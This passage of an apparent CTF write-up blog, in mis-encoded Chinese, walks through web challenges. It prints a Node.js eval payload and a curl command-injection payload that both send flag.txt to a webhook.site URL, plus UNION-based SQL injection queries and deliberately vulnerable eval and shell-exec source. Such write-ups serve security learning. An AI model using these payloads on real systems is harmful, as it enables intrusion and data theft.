invoke__">var_dump</span>(<span class="title function_ invoke__">verify_token</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230501145041707.png" alt="image-20230501145041707"></p><p>ç„¶åå°±å¯ä»¥æ‹¿åˆ°flagäº†</p><h2 id="Migraine"><a href="#Migraine" class="headerlink" title="Migraine"></a>Migraine</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230501145238358.png" alt="image-20230501145238358"></p><p>é¢˜ç›®ç»™äº†ä¸ªæºç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;uncaughtException&#x27;</span>, <span class="function">(<span class="params">err, origin</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname+<span class="string">&#x27;/static/index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> src = req.<span class="property">body</span>[<span class="string">&#x27;src&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (src.<span class="title function_">match</span>(<span class="regexp">/[A-Za-z0-9]/</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">418</span>).<span class="title function_">end</span>(<span class="string">&#x27;Bad character detected.&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">eval</span>(src);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">418</span>).<span class="title function_">end</span>(<span class="string">&#x27;Error on eval.&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening on port <span class="subst">$&#123;port&#125;</span>!`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€ä¸ªjavascriptçš„å‘½ä»¤æ‰§è¡Œï¼ŒæŠŠæ•°å­—å­—æ¯å…¨ç»™è¿‡æ»¤æ‰äº†ï¼Œå°±æ˜¯æ— æ•°å­—å­—æ¯çš„rce</p><p>è¿™é‡Œçš„è¯å°±å¾—ä½¿ç”¨jsfuckè¿›è¡Œç»•è¿‡äº†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;https&quot;</span>).<span class="title function_">get</span>(<span class="string">&quot;https://webhook.site/24e1c10f-df56-4421-8d89-a7ea91aa8610/?flag=&quot;</span>+process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>).<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag.txt&quot;</span>).<span class="title function_">toString</span>())</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä»£ç å’Œ<strong>ctfshow nodejs</strong>é‡Œé¢çš„é‚£ä¸ªä¸€æ ·ï¼Œ ä¸‹æ¬¡é‡åˆ°çš„è¯å¯ä»¥è¿›è¡Œå‚è€ƒ</p><p>å¦‚ä½•è¿›è¡Œjsfuckç¼–ç ï¼Œç„¶ååˆ°é¢˜ç›®é‡Œè¿è¡Œï¼Œç„¶ååœ¨webhook.siteå°±èƒ½æ¥æ”¶åˆ°flagäº†</p><p><img src="../images/image-20230501203954385.png" alt="image-20230501203954385"></p><h2 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230501161122636.png" alt="image-20230501161122636"></p><p>é¢˜ç›®ç»™äº†æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">escape_shell_cmd</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> <span class="string">&#x27;&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\\&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/curl&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">curl</span>():</span><br><span class="line">    url = flask.request.form.get(<span class="string">&#x27;ip&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> escape_shell_cmd(url):</span><br><span class="line">        command = <span class="string">&quot;curl -s -D - -o /dev/null &quot;</span> + url + <span class="string">&quot; | grep -oP &#x27;^HTTP.+[0-9]&#123;3&#125;&#x27;&quot;</span></span><br><span class="line">        output = os.popen(command).read().strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;HTTP&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> output:</span><br><span class="line">            <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Error: No response&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: output&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Illegal Characters Detected&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8001</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è€ƒç‚¹å°±æ˜¯curlå‘½ä»¤ çš„ä½¿ç”¨</p><p>è¿™é‡Œå…ˆéšä¾¿æ‹¿ä¸ªé¢˜ç›®çš„ç½‘ç«™è¿›è¡Œæµ‹è¯•ï¼Œç„¶åæŠ“åŒ…</p><p><img src="../images/image-20230501185955703.png" alt="image-20230501185955703"></p><p>å‘ç°å¯ä»¥</p><p><img src="../images/image-20230501190019175.png" alt="image-20230501190019175"></p><p>ç„¶åæµ‹è¯•ä¸€ä¸‹çœ‹èƒ½å¦ä½¿ç”¨  <code>;</code>è¿›è¡Œåˆ†å‰²</p><p><img src="../images/image-20230501190123233.png" alt="image-20230501190123233"></p><p>å‘ç°å¯ä»¥</p><p>ç„¶åå°±ç”¨é¢˜ç›®ç»™çš„payloadæ¥æ‰“äº†</p><p>å…ˆç›‘å¬ç«¯å£</p><p><img src="../images/image-20230501190208427.png" alt="image-20230501190208427"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=http://localhost;curl+-d@flag.txt+https://webhook.site/24e1c10f-df56-4421-8d89-a7ea91aa8610</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯ç”¨çš„æ˜¯ä¸“é—¨æ¥æ”¶httpè¯·æ±‚å¤´çš„ä¸€ä¸ªç½‘ç«™  <a href="https://webhook.site/">https://webhook.site/</a></p><p>è¿™é‡Œçš„è¯ç”¨è‡ªå·±çš„vpsä¸çŸ¥é“ä¸ºå•¥è¡Œä¸é€š</p><p><img src="../images/image-20230501202013603.png" alt="image-20230501202013603"></p><p>è¿™é‡Œçš„-dæ˜¯ä½¿ç”¨POSTè¯·æ±‚ï¼Œå› ä¸ºGETè¯·æ±‚çš„è¯ä¸ä¼šè¿”å›flag</p><h2 id="Lost-and-Forgotten"><a href="#Lost-and-Forgotten" class="headerlink" title="Lost and Forgotten"></a>Lost and Forgotten</h2><p>æˆ‘å¥½åƒå¿˜è®°äº†æˆ‘æœ€è¿‘å†™çš„æ–‡ç« çš„å¯†ç ã€‚è¯·é—®æœ‰æ²¡æœ‰ä»€ä¹ˆåŠæ³•å¯ä»¥æ¢å¤ã€‚</p><p><img src="../images/image-20230501202323192.png" alt="image-20230501202323192"></p><p>è€ƒå¯Ÿçš„æ˜¯sqlæ³¨å…¥</p><p><img src="../images/image-20230502150703358.png" alt="image-20230502150703358"></p><p>è¾“å…¥ä¸‹é¢çš„å†…å®¹çš„è¯ä¼šæŠŠwpå…¨éƒ¨ç»™è¾“å‡ºå‡ºæ¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ€€ç–‘æ˜¯ä¸æ˜¯sqlæ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; #</span><br></pre></td></tr></table></figure><p>è¾“å…¥ä¸‹é¢çš„è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,3,4,5,6#</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230502150852836.png" alt="image-20230502150852836"></p><p>è¿”å›è¿™ç»“æœï¼Œé‚£ä¹ˆå°±è¯´æ˜äº†æ˜¯sqlæ³¨å…¥äº†ï¼Œå¹¶ä¸”åœ¨123å‡ºéƒ½æœ‰å›æ˜¾ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åœ¨è¿™å‡ ä¸ªåœ°æ–¹è¿›è¡Œsqlæ³¨å…¥äº†</p><p><img src="../images/image-20230502151259631.png" alt="image-20230502151259631"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,(select database()),4,5,6#</span><br></pre></td></tr></table></figure><p>æŸ¥å‡ºæ•°æ®å</p><p>æ¥ç€æŸ¥è¡¨å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,(select table_name from information_schema.tables where table_schema = &quot;writeups&quot;),4,5,6#</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230502151547929.png" alt="image-20230502151547929"></p><p>æŸ¥å‡ºè¡¨åï¼Œæ¥ç€æŸ¥åˆ—å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,(select column_name from information_schema.columns where table_schema=database() and table_name=&quot;articles&quot; limit 1,1),4,5,6#</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230502151714536.png" alt="image-20230502151714536"></p><p>limit 1,1æŸ¥å‡ºæ¥ä¸€ä¸ªï¼Œé‚£ä¹ˆæ¥ç€å¾€åæŸ¥</p><p><img src="../images/image-20230502151807267.png" alt="image-20230502151807267"></p><p><img src="../images/image-20230502151829926.png" alt="image-20230502151829926"></p><p><img src="../images/image-20230502151844439.png" alt="image-20230502151844439"></p><p><img src="../images/image-20230502151859864.png" alt="image-20230502151859864"></p><p>æœ€å¤šèƒ½æŸ¥åˆ°limit 5,1    ä¹‹åçš„å°±æŸ¥ä¸åˆ°äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æŒ¨ä¸ªå¯¹åˆ—è¿›è¡Œå†…å®¹çš„è¯»å–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,access_code,4,5,6 from articles #</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230502152041491.png" alt="image-20230502152041491"></p><p>æœ€åæŸ¥åˆ°åŠ å¯†åçš„flag</p><p><img src="../images/image-20230502152333647.png" alt="image-20230502152333647"></p><p>æœ€å¥½æ”¾åˆ°secret codeé‡Œé¢å°±å¯ä»¥è§£å‡ºflagäº†</p><h2 id="Web-LTO"><a href="#Web-LTO" class="headerlink" title="Web LTO"></a>Web LTO</h2><p><img src="../images/image-20230501204706377.png" alt="image-20230501204706377"></p><p><img src="../images/image-20230501204726316.png" alt="image-20230501204726316"></p><p><strong>main.rs</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> actix_files::NamedFile;</span><br><span class="line"><span class="keyword">use</span> actix_multipart::Multipart;</span><br><span class="line"><span class="keyword">use</span> actix_web::cookie::Cookie;</span><br><span class="line"><span class="keyword">use</span> actix_web::http::StatusCode;</span><br><span class="line"><span class="keyword">use</span> actix_web::&#123;get, post, App, HttpRequest, HttpResponse, HttpServer, Responder, <span class="type">Result</span>&#125;;</span><br><span class="line"><span class="keyword">use</span> futures_util::stream::TryStreamExt;</span><br><span class="line"><span class="keyword">use</span> futures_util::StreamExt;</span><br><span class="line"><span class="keyword">use</span> rand::&#123;thread_rng, RngCore&#125;;</span><br><span class="line"><span class="keyword">use</span> std::collections::hash_map::DefaultHasher;</span><br><span class="line"><span class="keyword">use</span> std::fs::create_dir_all;</span><br><span class="line"><span class="keyword">use</span> std::hash::&#123;Hash, Hasher&#125;;</span><br><span class="line"><span class="keyword">use</span> std::io::&#123;ErrorKind, SeekFrom&#125;;</span><br><span class="line"><span class="keyword">use</span> std::path::PathBuf;</span><br><span class="line"><span class="keyword">use</span> std::<span class="type">str</span>::FromStr;</span><br><span class="line"><span class="keyword">use</span> tokio::fs::&#123;remove_file, write, File, OpenOptions&#125;;</span><br><span class="line"><span class="keyword">use</span> tokio::io::AsyncReadExt;</span><br><span class="line"><span class="keyword">use</span> tokio::io::&#123;copy, AsyncSeekExt&#125;;</span><br><span class="line"><span class="keyword">use</span> tokio_util::io::StreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">handle_multipart</span>(user_dir: &amp;PathBuf, <span class="keyword">mut</span> multipart: Multipart) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">count</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// optimised from: https://github.com/actix/examples/blob/db5f00e771573023a1d3de402f47a661c5799ec9/forms/multipart/src/main.rs#L8</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">let</span> <span class="variable">Some</span>(field) = multipart.<span class="title function_ invoke__">try_next</span>().<span class="keyword">await</span>? &#123;</span><br><span class="line">        count += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> count &gt; <span class="number">16</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">Err</span>(std::io::Error::<span class="title function_ invoke__">new</span>(</span><br><span class="line">                ErrorKind::InvalidInput,</span><br><span class="line">                <span class="string">&quot;Too many files provided in input!&quot;</span>,</span><br><span class="line">            )</span><br><span class="line">            .<span class="title function_ invoke__">into</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">content_disposition</span> = field.<span class="title function_ invoke__">content_disposition</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(filename) = content_disposition.<span class="title function_ invoke__">get_filename</span>() &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">hasher</span> = DefaultHasher::<span class="title function_ invoke__">new</span>();</span><br><span class="line">            filename.<span class="title function_ invoke__">hash</span>(&amp;<span class="keyword">mut</span> hasher);</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">tmp</span> = PathBuf::<span class="title function_ invoke__">from_str</span>(<span class="string">&quot;tmp/&quot;</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">            tmp.<span class="title function_ invoke__">push</span>(<span class="built_in">format!</span>(<span class="string">&quot;&#123;:016x&#125;&quot;</span>, hasher.<span class="title function_ invoke__">finish</span>()));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">file</span> = OpenOptions::<span class="title function_ invoke__">new</span>()</span><br><span class="line">                .<span class="title function_ invoke__">read</span>(<span class="literal">true</span>)</span><br><span class="line">                .<span class="title function_ invoke__">write</span>(<span class="literal">true</span>)</span><br><span class="line">                .<span class="title function_ invoke__">create</span>(<span class="literal">true</span>)</span><br><span class="line">                .<span class="title function_ invoke__">open</span>(&amp;tmp)</span><br><span class="line">                .<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">freader</span> = StreamReader::<span class="title function_ invoke__">new</span>(field.<span class="title function_ invoke__">map</span>(|result| &#123;</span><br><span class="line">                <span class="comment">// StreamReader-friendly</span></span><br><span class="line">                result.<span class="title function_ invoke__">map_err</span>(|err| std::io::Error::<span class="title function_ invoke__">new</span>(ErrorKind::Other, err))</span><br><span class="line">            &#125;))</span><br><span class="line">            .<span class="title function_ invoke__">take</span>(<span class="number">1</span> &lt;&lt; <span class="number">16</span>); <span class="comment">// max file size</span></span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">copy</span>(&amp;<span class="keyword">mut</span> freader, &amp;<span class="keyword">mut</span> file).<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// upload succeeded; copy to user area</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">destination</span> = user_dir.<span class="title function_ invoke__">join</span>(</span><br><span class="line">                tmp.<span class="title function_ invoke__">file_name</span>()</span><br><span class="line">                    .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Must be present based on filename creation.&quot;</span>),</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// avoid overhead from open()</span></span><br><span class="line">            file.<span class="title function_ invoke__">seek</span>(SeekFrom::<span class="title function_ invoke__">Start</span>(<span class="number">0</span>)).<span class="keyword">await</span>?;</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">orig</span> = file;</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">dest</span> = File::<span class="title function_ invoke__">create</span>(&amp;destination).<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">copy</span>(&amp;<span class="keyword">mut</span> orig, &amp;<span class="keyword">mut</span> dest).<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// cleanup</span></span><br><span class="line">            <span class="title function_ invoke__">drop</span>(orig);</span><br><span class="line">            <span class="title function_ invoke__">drop</span>(dest);</span><br><span class="line">            <span class="title function_ invoke__">remove_file</span>(tmp).<span class="keyword">await</span>?;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">Err</span>(std::io::Error::<span class="title function_ invoke__">new</span>(</span><br><span class="line">                ErrorKind::InvalidInput,</span><br><span class="line">                <span class="string">&quot;Missing filename from provided file.&quot;</span>.<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">            )</span><br><span class="line">            .<span class="title function_ invoke__">into</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[post(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">upload</span>(req: HttpRequest, multipart: Multipart) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;HttpResponse&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(user) = req.<span class="title function_ invoke__">cookie</span>(<span class="string">&quot;whoami&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">hasher</span> = DefaultHasher::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        user.<span class="title function_ invoke__">value</span>().<span class="title function_ invoke__">hash</span>(&amp;<span class="keyword">mut</span> hasher);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">user_dir</span> = PathBuf::<span class="title function_ invoke__">from</span>(<span class="built_in">format!</span>(<span class="string">&quot;user/&#123;:016x&#125;&quot;</span>, hasher.<span class="title function_ invoke__">finish</span>()));</span><br><span class="line">        <span class="title function_ invoke__">create_dir_all</span>(&amp;user_dir)?;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Err</span>(e) = <span class="title function_ invoke__">handle_multipart</span>(&amp;user_dir, multipart).<span class="keyword">await</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">write</span>(user_dir.<span class="title function_ invoke__">join</span>(<span class="string">&quot;error&quot;</span>), e.<span class="title function_ invoke__">to_string</span>()).<span class="keyword">await</span>?;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">body</span> = <span class="type">Vec</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">tar</span> = tar::Builder::<span class="title function_ invoke__">new</span>(&amp;<span class="keyword">mut</span> body);</span><br><span class="line">        tar.<span class="title function_ invoke__">append_dir_all</span>(<span class="string">&quot;submitted&quot;</span>, user_dir)?;</span><br><span class="line">        <span class="title function_ invoke__">drop</span>(tar);</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(HttpResponse::<span class="title function_ invoke__">build</span>(StatusCode::OK)</span><br><span class="line">            .<span class="title function_ invoke__">content_type</span>(<span class="string">&quot;application/tar&quot;</span>)</span><br><span class="line">            .<span class="title function_ invoke__">insert_header</span>((<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment&quot;</span>))</span><br><span class="line">            .<span class="title function_ invoke__">body</span>(body)</span><br><span class="line">            .<span class="title function_ invoke__">respond_to</span>(&amp;req)</span><br><span class="line">            .<span class="title function_ invoke__">map_into_boxed_body</span>())</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(HttpResponse::<span class="title function_ invoke__">new</span>(StatusCode::UNAUTHORIZED))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">index</span>(req: HttpRequest) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;HttpResponse&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">res</span> = NamedFile::<span class="title function_ invoke__">open</span>(<span class="string">&quot;www/index.html&quot;</span>)?.<span class="title function_ invoke__">into_response</span>(&amp;req);</span><br><span class="line">    <span class="keyword">if</span> req.<span class="title function_ invoke__">cookie</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_ invoke__">is_none</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span 